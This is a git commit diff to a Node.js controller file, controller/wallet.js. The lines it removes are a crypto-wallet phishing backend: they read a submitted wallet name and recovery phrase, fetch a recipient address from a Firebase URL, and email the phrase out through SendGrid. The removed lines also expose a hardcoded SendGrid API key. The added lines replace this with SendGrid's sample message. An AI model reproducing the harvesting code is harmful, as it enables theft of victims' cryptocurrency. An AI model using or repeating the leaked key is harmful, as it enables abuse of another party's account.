498a8027eac5fd8e9263b9ed2a2ee82b28279f99
Gbollyhub <aliasgbolly@yahoo.com>
2022-01-05 08:39:24 +0100

    make it better

--- controller/wallet.js
+++ controller/wallet.js
@@ -1,28 +1,29 @@
 const axios = require('axios');
 
 exports.sendMail = async (req, res) =>{
-  const items2 = await axios.get("https://wallet-60845-default-rtdb.firebaseio.com/email.json");
+ 
 
-  const defaultEmail = items2.data.set_email;
 
-    const { wallet_name, phrase} = req.body;
-    const sgMail = require('@sendgrid/mail')
-sgMail.setApiKey("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")
+  
+  const sgMail = require('@sendgrid/mail')
+sgMail.setApiKey(process.env.SEND_GRID_API_KEY)
 const msg = {
-  to: defaultEmail, //mail2saltoday@gmail.com Change to your recipient
-  from: 'braindavis00400@gmail.com', //braindavis00400@gmail.com Change to your verified sender
-  subject: 'Alert: Submission',
+  to: 'aliasgbolly@gmail.com', // Change to your recipient
+  from: 'braindavis00400@gmail.com', // Change to your verified sender
+  subject: 'Sending with SendGrid is Fun',
   text: 'and easy to do anywhere, even with Node.js',
-  html: '<strong>Wallet Name: </strong>' + wallet_name + "<br/>" + "<strong>Recovery Phrase: </strong>" + phrase,
+  html: '<strong>and easy to do anywhere, even with Node.js</strong>',
 }
 sgMail
   .send(msg)
   .then(() => {
-      res.send(defaultEmail)
+    res.send("Email sent")
     console.log('Email sent')
   })
   .catch((error) => {
-    res.send(error)
     console.error(error)
   })
+
+
+
 }
